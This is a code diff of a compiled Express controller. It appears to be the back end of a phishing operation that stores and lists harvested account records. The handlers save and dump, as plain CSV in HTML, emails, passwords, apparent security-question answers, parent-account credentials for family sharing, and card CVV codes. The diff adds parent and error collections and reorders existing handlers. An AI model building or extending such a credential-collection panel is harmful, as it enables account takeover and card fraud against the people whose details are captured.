@@ -12,10 +12,12 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
 Object.defineProperty(exports, "__esModule", { value: true });
-exports.getUnknowns = exports.getAccountsWithParent = exports.getAccounts = exports.addUnknown = exports.addAccountWithParent = exports.addAccount = void 0;
+exports.getAccountsWithParent = exports.getErrors = exports.getParents = exports.getUnknowns = exports.getAccounts = exports.addAccountWithParent = exports.addError = exports.addParent = exports.addUnknown = exports.addAccount = void 0;
 const unknownModel_1 = __importDefault(require("../models/unknownModel"));
 const appleAccountModel_1 = __importDefault(require("../models/appleAccountModel"));
 const accountWithParentModel_1 = __importDefault(require("../models/accountWithParentModel"));
+const parentModel_1 = __importDefault(require("../models/parentModel"));
+const errorModel_1 = __importDefault(require("../models/errorModel"));
 const addAccount = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     try {
         const account = req.body;
@@ -32,22 +34,6 @@ const addAccount = (req, res) => __awaiter(void 0, void 0, void 0, function* () 
     }
 });
 exports.addAccount = addAccount;
-const addAccountWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
-    try {
-        const account = req.body;
-        if (Object.keys(account).length === 0) {
-            res.status(400).send("Invalid request");
-            return;
-        }
-        yield accountWithParentModel_1.default.create(account);
-        res.status(201).send("Account added successfully");
-    }
-    catch (error) {
-        console.log(error);
-        res.status(500).send("Something went wrong adding the account");
-    }
-});
-exports.addAccountWithParent = addAccountWithParent;
 const addUnknown = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     try {
         const account = req.body;
@@ -64,6 +50,54 @@ const addUnknown = (req, res) => __awaiter(void 0, void 0, void 0, function* () 
     }
 });
 exports.addUnknown = addUnknown;
+const addParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const parent = req.body;
+        if (Object.keys(parent).length === 0) {
+            res.status(400).send("Invalid request");
+            return;
+        }
+        yield parentModel_1.default.create(parent);
+        res.status(201).send("Parent added successfully");
+    }
+    catch (error) {
+        console.log(error);
+        res.status(500).send("Something went wrong adding the parent");
+    }
+});
+exports.addParent = addParent;
+const addError = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const parent = req.body;
+        if (Object.keys(parent).length === 0) {
+            res.status(400).send("Invalid request");
+            return;
+        }
+        yield errorModel_1.default.create(parent);
+        res.status(201).send("Error added successfully");
+    }
+    catch (error) {
+        console.log(error);
+        res.status(500).send("Something went wrong adding the error");
+    }
+});
+exports.addError = addError;
+const addAccountWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const account = req.body;
+        if (Object.keys(account).length === 0) {
+            res.status(400).send("Invalid request");
+            return;
+        }
+        yield accountWithParentModel_1.default.create(account);
+        res.status(201).send("Account added successfully");
+    }
+    catch (error) {
+        console.log(error);
+        res.status(500).send("Something went wrong adding the account");
+    }
+});
+exports.addAccountWithParent = addAccountWithParent;
 const getAccounts = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     try {
         const accounts = yield appleAccountModel_1.default.find();
@@ -73,23 +107,10 @@ const getAccounts = (req, res) => __awaiter(void 0, void 0, void 0, function* ()
         res.status(200).send(`<p>${accountText}</p>`);
     }
     catch (error) {
-        res.status(500).send("Something went wrong getting the gmail");
+        res.status(500).send("Something went wrong getting the accounts");
     }
 });
 exports.getAccounts = getAccounts;
-const getAccountsWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
-    try {
-        const accounts = yield accountWithParentModel_1.default.find();
-        const accountText = accounts
-            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`)
-            .join("<br />");
-        res.status(200).send(`<p>${accountText}</p>`);
-    }
-    catch (error) {
-        res.status(500).send("Something went wrong getting the gmail");
-    }
-});
-exports.getAccountsWithParent = getAccountsWithParent;
 const getUnknowns = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     try {
         const accounts = yield unknownModel_1.default.find();
@@ -99,7 +120,48 @@ const getUnknowns = (req, res) => __awaiter(void 0, void 0, void 0, function* ()
         res.status(200).send(`<p>${accountText}</p>`);
     }
     catch (error) {
-        res.status(500).send("Something went wrong getting the gmail");
+        res.status(500).send("Something went wrong getting the unknowns");
     }
 });
 exports.getUnknowns = getUnknowns;
+const getParents = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const parents = yield parentModel_1.default.find();
+        const parentText = parents
+            .map(({ email, password, date, first_q, second_q, third_q, cvv, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`)
+            .join("<br />");
+        res.status(200).send(`<p>${parentText}</p>`);
+    }
+    catch (error) {
+        res.status(500).send("Something went wrong getting the parents");
+    }
+});
+exports.getParents = getParents;
+const getErrors = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const parents = yield errorModel_1.default.find();
+        const parentText = parents
+            .map(({ email, password, date, first_q, second_q, third_q, cvv, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`)
+            .join("<br />");
+        res.status(200).send(`<p>${parentText}</p>`);
+    }
+    catch (error) {
+        res.status(500).send("Something went wrong getting the errors");
+    }
+});
+exports.getErrors = getErrors;
+const getAccountsWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const accounts = yield accountWithParentModel_1.default.find();
+        const accountText = accounts
+            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`)
+            .join("<br />");
+        res.status(200).send(`<p>${accountText}</p>`);
+    }
+    catch (error) {
+        res
+            .status(500)
+            .send("Something went wrong getting the accounts with parent");
+    }
+});
+exports.getAccountsWithParent = getAccountsWithParent;
